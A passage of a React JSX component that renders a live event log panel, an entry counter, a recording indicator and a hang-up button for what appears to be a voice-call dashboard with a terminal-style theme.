              </div>
            </div>
            <div style={{ padding: "0 12px 12px", flex: 1, display: "flex", flexDirection: "column" }}>
              <div ref={logRef} className="live-log-container" style={{
                background: "var(--bg-void)",
                border: "1px solid var(--border-subtle)",
                padding: "10px",
                flex: 1,
                minHeight: "180px",
                maxHeight: "340px",
                overflowY: "auto",
              }}>
                {logs.length === 0 ? (
                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: "140px", gap: "8px" }}>
                    <Terminal size={20} style={{ opacity: 0.12 }} />
                    <span style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-ghost)" }}>awaiting_session_init...</span>
                    <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-ghost)", opacity: 0.5 }}>// live events will stream here</span>
                  </div>
                ) : logs.map(log => (
                  <div key={log.id} className={`log-entry log-${log.type}`}>
                    <span className="log-ts">{log.ts}</span>
                    <span className="log-tag">{log.tag}</span>
                    <span className="log-msg">{log.msg}</span>
                  </div>
                ))}
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", marginTop: "8px", borderTop: "1px solid var(--border-subtle)", paddingTop: "8px" }}>
                <Lock size={10} color="var(--green-dim)" />
                <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-ghost)", flex: 1 }}>
                  ENCRYPTED_OUTPUT // {logs.length} entries
                </span>
                {callState === "active" && (
                  <span className="rec-indicator">
                    <span className="status-pip red" style={{ width: "5px", height: "5px" }} /> REC
                  </span>
                )}
              </div>
            </div>
          </div>

          {/* ── Active Call Controls (bottom) ── */}
          {callState === "active" && activeCallId && (
            <div className="cyber-panel" style={{ background: "rgba(255,171,0,0.03)" }}>
              <div className="panel-header" style={{ borderBottom: "1px solid rgba(255,171,0,0.15)" }}>
                <PhoneCall size={13} color="var(--amber-warn)" />
                <span className="panel-header-label" style={{ color: "var(--amber-warn)", textShadow: "0 0 8px var(--amber-warn)" }}>CALL_CONTROLS</span>
                <span className="bracket-label" style={{ color: "var(--amber-warn)" }}>[{activeCallId.slice(0, 16)}...]</span>
              </div>
              <div style={{ padding: "12px 16px", display: "flex", gap: "8px" }}>
                <button className="hbtn hbtn-exec active-call" style={{ flex: 1, padding: "10px 14px", fontSize: "12px", fontWeight: 700 }} onClick={endCall}>
                  <PhoneOff size={13} /> HANGUP
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
